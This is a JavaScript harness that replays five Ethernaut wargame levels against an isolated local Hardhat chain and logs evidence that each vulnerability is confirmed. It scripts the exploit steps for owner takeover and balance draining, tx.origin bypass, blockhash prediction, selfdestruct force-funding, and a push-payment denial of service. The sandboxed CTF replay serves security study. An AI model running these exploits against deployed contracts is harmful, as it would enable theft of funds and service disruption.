'use strict';

// Run the small, pinned Ethernaut subset against an isolated local EVM.
// The Python wrapper owns compiler selection and manifest/evidence updates.
const fs = require('node:fs');
const path = require('node:path');
const crypto = require('node:crypto');

const root = process.env.CAMPAIGN_PROJECT_ROOT || path.resolve(__dirname, '..');
process.env.HARDHAT_CONFIG = path.join(root, 'scripts/local-test-hardhat.cjs');
const deps = path.join(root, 'flare-scan/contracts/firelight-core/node_modules');
const hre = require(path.join(deps, 'hardhat'));
const { BrowserProvider, ContractFactory, Contract, parseEther, ZeroAddress } = require(path.join(deps, 'ethers'));
const solcBase = require(path.join(root, 'flare-scan/tools/solc-0828/node_modules/solc'));
const solc = solcBase.setupMethods(require(process.env.CAMPAIGN_SOLJSON));
const { LOCAL_CHAIN_ID, parseForkConfig, publicBoundary } = require('./dynamic-execution-boundary.cjs');

const CHALLENGES = new Set(['fallback', 'telephone', 'coinflip', 'force', 'king']);
const SETTINGS = Object.freeze({
  optimizer: { enabled: false, runs: 200 },
  metadata: { bytecodeHash: 'none' },
  outputSelection: { '*': { '*': ['abi', 'evm.bytecode.object'] } },
});

function sha256(value) { return crypto.createHash('sha256').update(value).digest('hex'); }
function jsonSha256(value) { return sha256(JSON.stringify(value)); }
function compile(sources) {
  const input = { language: 'Solidity', sources, settings: SETTINGS };
  const output = JSON.parse(solc.compile(JSON.stringify(input)));
  const errors = (output.errors || []).filter((row) => row.severity === 'error');
  if (errors.length) throw new Error(`ethernaut_compile_failed:${errors.map((row) => row.formattedMessage).join('\n')}`);
  return output;
}
function artifact(output, sourceName, contractName) {
  const row = output.contracts?.[sourceName]?.[contractName];
  if (!row?.abi || !row.evm?.bytecode?.object) throw new Error(`ethernaut_artifact_missing:${sourceName}:${contractName}`);
  return row;
}
async function deploy(output, sourceName, contractName, signer, args = [], overrides = {}) {
  const row = artifact(output, sourceName, contractName);
  const factory = new ContractFactory(row.abi, row.evm.bytecode.object, signer);
  const contract = await factory.deploy(...args, ...(Object.keys(overrides).length ? [overrides] : []));
  await contract.waitForDeployment();
  return contract;
}
function assertion(name, expected, actual) {
  const expectedText = typeof expected === 'bigint' ? expected.toString() : String(expected);
  const actualText = typeof actual === 'bigint' ? actual.toString() : String(actual);
  return { name, expected: expectedText, actual: actualText, passed: expectedText === actualText };
}
async function txEvidence(provider, receipt) {
  const row = { transactionHash: receipt.hash, status: Number(receipt.status), blockNumber: receipt.blockNumber,
    gasUsed: receipt.gasUsed?.toString?.() || null };
  try {
    const trace = await provider.send('debug_traceTransaction', [receipt.hash, {}]);
    row.callCount = (trace.structLogs || []).filter((item) => ['CALL', 'DELEGATECALL', 'STATICCALL', 'CALLCODE'].includes(item.op)).length;
  } catch (error) {
    row.traceUnavailable = String(error?.message || error).slice(0, 240);
  }
  return row;
}
function sourceFiles(manifest, sample) {
  const files = sample.sourceFiles || [];
  if (!files.length) throw new Error('ethernaut_manifest_source_files_missing');
  const sources = [];
  for (const file of files) {
    if (!file || typeof file.path !== 'string' || typeof file.objectPath !== 'string' || typeof file.sha256 !== 'string') {
      throw new Error('ethernaut_manifest_source_entry_invalid');
    }
    const full = path.resolve(root, file.objectPath);
    const content = fs.readFileSync(full, 'utf8');
    if (sha256(content) !== file.sha256) throw new Error(`ethernaut_source_hash_mismatch:${file.path}`);
    sources.push({ path: file.path, content, sha256: file.sha256 });
  }
  const bundle = sha256(sources.map((file) => `${file.path}:${file.sha256}\n`).join(''));
  if (bundle !== sample.sourceBundleSha256) throw new Error('ethernaut_source_bundle_hash_mismatch');
  return sources;
}
function sourceEntry(sample, predicate) {
  const row = (sample.sourceFiles || []).find(predicate);
  if (!row) throw new Error('ethernaut_target_source_missing');
  return row;
}
function compilerArtifact() {
  return { version: process.env.ETHERNAUT_COMPILER_VERSION || null,
    sha256: process.env.ETHERNAUT_COMPILER_SHA256 || null,
    longVersion: solc.version(), kind: 'solc-js' };
}
async function runFallback(target, provider, deployer, player, boundary) {
  const targetAddress = await target.getAddress();
  const playerAddress = await player.getAddress();
  const beforeOwner = await target.owner();
  const beforeBalance = await provider.getBalance(targetAddress);
  const contribution = await (await target.connect(player).contribute({ value: 100000000000000n })).wait();
  const send = await (await player.sendTransaction({ to: targetAddress, value: 1000000000000000n })).wait();
  const ownerAfterTakeover = await target.owner();
  const afterTakeoverBalance = await provider.getBalance(targetAddress);
  const withdraw = await (await target.connect(player).withdraw()).wait();
  const afterBalance = await provider.getBalance(targetAddress);
  const assertions = [assertion('owner_changes_to_player', playerAddress, ownerAfterTakeover),
    assertion('target_balance_drained', 0n, afterBalance), assertion('target_received_ether', true, afterTakeoverBalance > beforeBalance)];
  return { challenge: 'fallback', vulnerability: 'fallback_owner_takeover', targetAddress,
    transactions: [await txEvidence(provider, contribution), await txEvidence(provider, send), await txEvidence(provider, withdraw)],
    before: { owner: beforeOwner, balanceWei: beforeBalance.toString() },
    after: { owner: ownerAfterTakeover, balanceWei: afterBalance.toString() }, assertions,
    confirmedVulnerability: assertions.every((row) => row.passed),
    reproduction: 'contribute(<0.001 ETH) -> send ETH through receive() -> owner-only withdraw()' };
}
async function runTelephone(target, provider, player, attackFile, boundary) {
  const targetAddress = await target.getAddress();
  const playerAddress = await player.getAddress();
  const attackCode = attackFile.content;
  const attackOutput = compile({ [attackFile.path]: { content: attackCode }, [attackFile.targetPath]: { content: attackFile.targetContent } });
  const attacker = await deploy(attackOutput, attackFile.path, 'TelephoneAttack', player);
  const beforeOwner = await target.owner();
  const receipt = await (await attacker.connect(player).attack(targetAddress, playerAddress)).wait();
  const afterOwner = await target.owner();
  const assertions = [assertion('owner_changes_to_player', playerAddress, afterOwner), assertion('owner_was_not_player', true, beforeOwner.toLowerCase() !== playerAddress.toLowerCase())];
  return { challenge: 'telephone', vulnerability: 'tx_origin_authorization', targetAddress, attackerAddress: await attacker.getAddress(),
    attackerSourcePath: attackFile.path, attackerSourceSha256: attackFile.sha256, runnerAttackSourceSha256: sha256(attackCode), transactions: [await txEvidence(provider, receipt)],
    before: { owner: beforeOwner }, after: { owner: afterOwner }, assertions,
    confirmedVulnerability: receipt.status === 1 && assertions.every((row) => row.passed),
    reproduction: 'intermediate attacker contract calls changeOwner(); tx.origin remains the EOA while msg.sender is the contract' };
}
async function runCoinflip(target, provider, player, attackFile, boundary) {
  const targetAddress = await target.getAddress();
  const attackCode = attackFile.content;
  const attackOutput = compile({ [attackFile.path]: { content: attackCode }, [attackFile.targetPath]: { content: attackFile.targetContent } });
  const attacker = await deploy(attackOutput, attackFile.path, 'CoinFlipAttack', player);
  const receipts = [];
  for (let index = 0; index < 10; index += 1) {
    const receipt = await (await attacker.connect(player).attack(targetAddress)).wait();
    receipts.push(await txEvidence(provider, receipt));
  }
  const wins = await target.consecutiveWins();
  const assertions = [assertion('ten_consecutive_wins', 10n, wins), assertion('each_attack_mined_separate_block', true, new Set(receipts.map((row) => row.blockNumber)).size === 10)];
  return { challenge: 'coinflip', vulnerability: 'predictable_block_randomness', targetAddress, attackerAddress: await attacker.getAddress(),
    attackerSourcePath: attackFile.path, attackerSourceSha256: attackFile.sha256, runnerAttackSourceSha256: sha256(attackCode), transactions: receipts, before: { consecutiveWins: '0' }, after: { consecutiveWins: wins.toString() }, assertions,
    confirmedVulnerability: assertions.every((row) => row.passed), reproduction: 'derive blockhash(block.number - 1) inside the attacker and repeat across ten mined blocks' };
}
async function runForce(target, provider, player, attackFile, boundary) {
  const targetAddress = await target.getAddress();
  const attackCode = attackFile.content;
  const attackOutput = compile({ [attackFile.path]: { content: attackCode } });
  const beforeBalance = await provider.getBalance(targetAddress);
  const attacker = await deploy(attackOutput, attackFile.path, 'ForceAttack', player, [], { value: parseEther('1') });
  const attackerAddress = await attacker.getAddress();
  const receipt = await (await attacker.connect(player).attack(targetAddress)).wait();
  const afterBalance = await provider.getBalance(targetAddress);
  const assertions = [assertion('target_initially_empty', 0n, beforeBalance), assertion('forced_balance_received', parseEther('1'), afterBalance)];
  return { challenge: 'force', vulnerability: 'forced_ether_selfdestruct', targetAddress, attackerAddress, attackerSourcePath: attackFile.path, attackerSourceSha256: attackFile.sha256, runnerAttackSourceSha256: sha256(attackCode),
    transactions: [await txEvidence(provider, receipt)], before: { balanceWei: beforeBalance.toString() }, after: { balanceWei: afterBalance.toString() }, assertions,
    confirmedVulnerability: receipt.status === 1 && assertions.every((row) => row.passed), reproduction: 'fund a helper contract, then selfdestruct(target) to bypass target receive/fallback rules' };
}
async function runKing(target, provider, player, attackFile, boundary) {
  const targetAddress = await target.getAddress();
  const playerAddress = await player.getAddress();
  const attackCode = attackFile.content;
  const attackOutput = compile({ [attackFile.path]: { content: attackCode } });
  const attacker = await deploy(attackOutput, attackFile.path, 'KingAttack', player);
  const attackerAddress = await attacker.getAddress();
  const becomeKing = await (await attacker.connect(player).doYourThing(targetAddress, { value: parseEther('2') })).wait();
  const kingAfterAttack = await target._king();
  const prizeAfterAttack = await target.prize();
  let blocked = null;
  try {
    blocked = await (await player.sendTransaction({ to: targetAddress, value: parseEther('2.1'), gasLimit: 500000n })).wait();
  } catch (error) {
    blocked = error.receipt || null;
  }
  const blockedStatus = blocked ? Number(blocked.status) : 0;
  const kingAfterBlocked = await target._king();
  const assertions = [assertion('attacker_becomes_king', attackerAddress, kingAfterAttack), assertion('next_payment_reverts', 0, blockedStatus), assertion('king_remains_attacker', attackerAddress, kingAfterBlocked)];
  return { challenge: 'king', vulnerability: 'denial_of_service_push_payment', targetAddress, attackerAddress, attackerSourcePath: attackFile.path, attackerSourceSha256: attackFile.sha256, runnerAttackSourceSha256: sha256(attackCode),
    transactions: [await txEvidence(provider, becomeKing)], blockedTransaction: blocked ? await txEvidence(provider, blocked) : null, checkedReverted: blockedStatus === 0, before: { king: await target.owner(), prizeWei: parseEther('1').toString() },
    after: { king: kingAfterBlocked, attackerKing: kingAfterAttack, prizeWei: prizeAfterAttack.toString(), blockedTransactionStatus: blockedStatus }, assertions,
    confirmedVulnerability: becomeKing.status === 1 && assertions.every((row) => row.passed), reproduction: 'contract with rejecting receive() becomes king; next push payment reverts and crown cannot advance' };
}

(async () => {
  const challenge = process.argv[2];
  if (!CHALLENGES.has(challenge)) throw new Error(`unsupported_ethernaut_challenge:${challenge}`);
  const manifest = JSON.parse(fs.readFileSync(path.join(root, 'training-data/ethernaut/manifest.json'), 'utf8'));
  const sample = (manifest.samples || []).find((row) => row.challenge === challenge);
  if (!sample || manifest.commit !== 'c6174bb3b68dde01ff15571e67ad5254cc6939a9') throw new Error('ethernaut_manifest_not_pinned');
  const files = sourceFiles(manifest, sample);
  const targetFile = sourceEntry(sample, (row) => row.path.includes('/levels/'));
  const targetContent = files.find((row) => row.path === targetFile.path).content;
  const attackEntry = (sample.sourceFiles || []).find((row) => row.path.includes('/attacks/'));
  const attackFile = attackEntry ? { ...attackEntry, content: files.find((row) => row.path === attackEntry.path).content,
    targetPath: targetFile.path, targetContent } : null;
  const targetOutput = compile({ [targetFile.path]: { content: targetContent } });
  const contractNames = { fallback: 'Fallback', telephone: 'Telephone', coinflip: 'CoinFlip', force: 'Force', king: 'King' };
  const contractName = contractNames[challenge];
  if (hre.network.name !== 'hardhat' || hre.network.config.url || hre.network.config.forking) throw new Error('ethernaut_evm_not_isolated');
  const fork = parseForkConfig(process.env);
  if (fork.requested || !fork.valid) throw new Error('ethernaut_dynamic_requires_isolated_local_evm');
  const provider = new BrowserProvider(hre.network.provider, undefined, { cacheTimeout: -1 });
  const chainId = Number((await provider.getNetwork()).chainId);
  if (chainId !== LOCAL_CHAIN_ID) throw new Error('ethernaut_chain_id_mismatch');
  const [deployer, player] = await Promise.all([provider.getSigner(0), provider.getSigner(1)]);
  const target = await deploy(targetOutput, targetFile.path, contractName, deployer, challenge === 'king' ? [] : [], challenge === 'king' ? { value: parseEther('1') } : {});
  const boundary = publicBoundary(fork, { chainId, forkState: 'not_performed' });
  let result;
  if (challenge === 'fallback') result = await runFallback(target, provider, deployer, player, boundary);
  else if (challenge === 'telephone') result = await runTelephone(target, provider, player, attackFile, boundary);
  else if (challenge === 'coinflip') result = await runCoinflip(target, provider, player, attackFile, boundary);
  else if (challenge === 'force') result = await runForce(target, provider, player, attackFile, boundary);
  else result = await runKing(target, provider, player, attackFile, boundary);
  result.schemaVersion = 1;
  result.state = result.confirmedVulnerability ? 'confirmed' : 'failed';
  result.sourceCommit = manifest.commit;
  result.sourceSha256 = targetFile.sha256;
  result.sourceBundleSha256 = sample.sourceBundleSha256;
  result.compilerArtifact = compilerArtifact();
  result.executionBoundary = boundary;
  result.reason = result.confirmedVulnerability ? null : 'ethernaut_assertion_failed';
  result.mode = 'isolated_in_process';
  result.targetCompilerSourceName = targetFile.path;
  process.stdout.write(`${JSON.stringify(result)}\n`);
  if (!result.confirmedVulnerability) process.exitCode = 1;
})().catch((error) => { process.stderr.write(`${error.stack || error}\n`); process.exitCode = 1; });
